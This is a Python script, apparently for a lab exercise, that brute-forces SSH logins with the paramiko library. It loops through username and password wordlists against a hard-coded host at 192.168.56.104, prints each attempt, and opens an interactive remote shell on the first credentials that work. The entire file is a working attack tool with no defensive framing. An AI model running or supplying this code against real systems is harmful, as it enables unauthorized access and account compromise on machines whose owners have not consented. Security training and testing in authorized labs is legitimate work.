import paramiko

def ssh_connect(hostname, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname, port, username, password)
        print(f"Success: Username - {username}, Password - {password}")
        return client
    except paramiko.AuthenticationException:
        return None
    except paramiko.SSHException as sshException:
        print(f"Could not establish SSH connection: {sshException}")
        return None
    except Exception as e:
        print(f"Exception in connecting to the SSH server: {e}")
        return None

def interactive_shell(channel):
    while True:
        command = input("$ ")
        if command.lower() == "exit":
            break
        channel.send(command + "\n")
        while not channel.recv_ready():
            pass
        output = channel.recv(1024).decode()
        print(output, end="")

def brute_force_ssh(hostname, port, username_file, password_list_file):
    with open(username_file, 'r') as uf, open(password_list_file, 'r') as pf:
        usernames = [line.strip() for line in uf]
        passwords = [line.strip() for line in pf]
        
        for username in usernames:
            for password in passwords:
                client = ssh_connect(hostname, port, username, password)
                if client:
                    channel = client.invoke_shell()
                    print("Interactive SSH session established. Type 'exit' to quit.")
                    interactive_shell(channel)
                    channel.close()
                    client.close()
                    return
                else:
                    print(f"Failed: Username - {username}, Password - {password}")

def main():
    hostname = "192.168.56.104"
    port = 22
    username_file = "user.txt"
    password_list_file = "password.txt"

    brute_force_ssh(hostname, port, username_file, password_list_file)

if __name__ == "__main__":
    main()
